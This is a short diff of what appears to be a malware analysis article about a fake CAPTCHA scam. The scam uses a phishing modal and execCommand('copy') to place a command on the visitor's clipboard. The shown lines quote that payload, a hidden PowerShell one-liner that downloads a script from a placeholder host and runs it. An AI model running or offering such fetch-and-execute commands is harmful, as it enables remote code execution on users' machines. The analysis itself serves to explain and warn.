@@ -57,7 +57,9 @@ function open_modal() {
 }
 ```
 
-It creates a phishing modal and uses [execCommand("copy")] to secretly copy a command to your clipboard. Let's see what the command does:
+It creates a phishing modal and uses [execCommand("copy")] to secretly copy a command to your clipboard.
+Browsers cannot automatically copy texts to the user's clipboard. This requires the user's interaction, so there is a CAPTCHA here.
+Let's see what the command does:
 
 ```powershell
 powershell -WindowStyle Hidden ([ScriptBlock]::Create((irm https://example.com/scam))).Invoke()
